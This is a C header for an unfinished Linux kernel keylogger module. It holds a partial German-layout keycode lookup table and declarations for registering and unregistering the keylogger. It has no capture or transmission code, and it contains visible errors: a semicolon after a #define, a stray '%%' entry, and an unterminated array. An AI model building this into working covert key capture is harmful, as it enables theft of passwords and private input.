#ifndef KEYLOGGER_h
#define KEYLOGGER_h

#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");

#define KEYCODE_LOOKUP_TABLE_SIZE 128; //TODO: replcae with proper number

//TODO: Define keycode lookup table for german layout ~~> continue
const char *keycode_lookup_table[][3] = {
    {"_ESCAPE_", "\0", "\0"}, {"1", "!", "\0"}, {"2", "\"", "²"},
    {"3", "§", "³"}, {"4", "$", "¼"}, {"5", "%%", "½"}, {"6", "&", "¬"},
    {"7", "/", "{"}, {"8", "(", "["}, {"9", ")", "]"}, {"0", "=", "}"},
    {"ß", "?", "\\"}, {"´", "´", "\0"}, {"_BACK_", "\0", "\0"},
    {"_TAB_", "\0", "\0"}, {"q", "Q", "@"}, {"w", "W", "\0"},
    {"e", "E", "€"}, {"r", "R", "\0"}, {"t", "T", "\0"},
    {"z", "Z", "\0"}, {"u", "U", "\0"}, {"i", "I", "\0"},
    {"o", "O", "\0"}, {"p", "P", "\0"}, {"ü", "Ü", "\0"},
    {"+", "*", "~"}, {"_ENTER_", "_ENTER_", "\0"},
    {"a", "A", "\0"}, {"s", "S", "\0"}, {"d", "D", "\0"},
    {"f", "F", "\0"}, {"g", "G", "\0"}, {"h", "H", "\0"},
    {"j", "J", "\0"}, {"k", "K", "\0"}, {"l", "L", "\0"},
    {"ö", "Ö", "\0"}, {"ä", "Ä", "\0"}, {"^", "°", "\0"},
    {"_SHIFT_", "_SHIFT_", "\0"}, {"#", "'", "\0"},

}

void register_keylogger(void);

void unregister_keylogger(void);

#endif